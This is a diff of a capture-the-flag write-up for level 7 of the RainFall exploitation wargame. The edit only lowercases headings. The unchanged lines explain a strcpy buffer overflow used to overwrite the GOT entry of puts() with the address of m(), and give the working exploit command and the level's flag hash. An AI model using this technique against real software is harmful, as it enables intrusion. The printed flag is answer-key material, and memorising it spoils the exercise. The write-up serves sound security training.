@@ -1,6 +1,6 @@
-# Level7
+# level7
 
-## Exploring the binary
+## exploring the binary
 ```shell
 level7@RainFall:~$ ./level7
 Segmentation fault (core dumped)
@@ -129,7 +129,7 @@ We observe that this function prints the contents of a variable stored at <code>
 ## buffer overflow
 We've observed that <code>main()</code> once again employs <code>strcpy()</code>, suggesting another potential <code>buffer overflow</code> vulnerability. In this level, two strings serve as input, enabling us to leverage a <code>GOT overwrite</code> to modify the address designated as the destination for the second copied string. To achieve this, we'll overwrite the address of a function called within <code>main()</code>, redirecting it to the function responsible for printing the contents of <code>c</code>. Since the execution of <code>puts()</code> isn't necessary, we opt to replace its address (<code>0x08049928</code>) with that of <code>m()</code> (<code>0x080484f4</code>). The only thing left is to find the offset of the first <code>strcpy()</code>, which is equal to 20.
 
-## Exploit
+## exploit
 ``` shell
 level7@RainFall:~$ ./level7 $(python -c 'print "F" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
